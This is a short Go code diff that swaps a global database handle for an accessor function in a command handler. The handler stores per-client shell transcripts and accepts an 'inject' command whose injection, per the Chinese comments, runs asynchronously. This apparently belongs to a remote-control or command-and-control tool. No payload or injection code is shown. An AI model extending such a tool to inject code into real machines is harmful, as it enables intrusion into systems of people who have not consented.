@@ -133,11 +133,11 @@ func resolveCommand(uid, command string) (byteToSend []byte, send bool) {
 
 	// 清屏：就地更新 shell 内容，不向客户端下发
 	if strings.HasPrefix(command, "clear") {
-		if database.Engine != nil {
+		if database.DB() != nil {
 			var shell database.Shell
-			database.Engine.Where("uid = ?", uid).Get(&shell)
+			database.DB().Where("uid = ?", uid).Get(&shell)
 			shell.ShellContent = "$ clear"
-			database.Engine.Where("uid = ?", uid).Update(&shell)
+			database.DB().Where("uid = ?", uid).Update(&shell)
 		}
 		return nil, false
 	}
@@ -146,11 +146,11 @@ func resolveCommand(uid, command string) (byteToSend []byte, send bool) {
 	// （不再落入系统 shell；就地更新 shell content 立即反馈"任务已下发"，实际注入异步执行）
 	if strings.HasPrefix(command, "inject ") {
 		writeShellLine := func(msg string) ([]byte, bool) {
-			if database.Engine != nil {
+			if database.DB() != nil {
 				var shell database.Shell
-				database.Engine.Where("uid = ?", uid).Get(&shell)
+				database.DB().Where("uid = ?", uid).Get(&shell)
 				shell.ShellContent = "$ " + command + "\n[+] " + msg + "\n"
-				database.Engine.Where("uid = ?", uid).Update(&shell)
+				database.DB().Where("uid = ?", uid).Update(&shell)
 			}
 			return nil, false
 		}
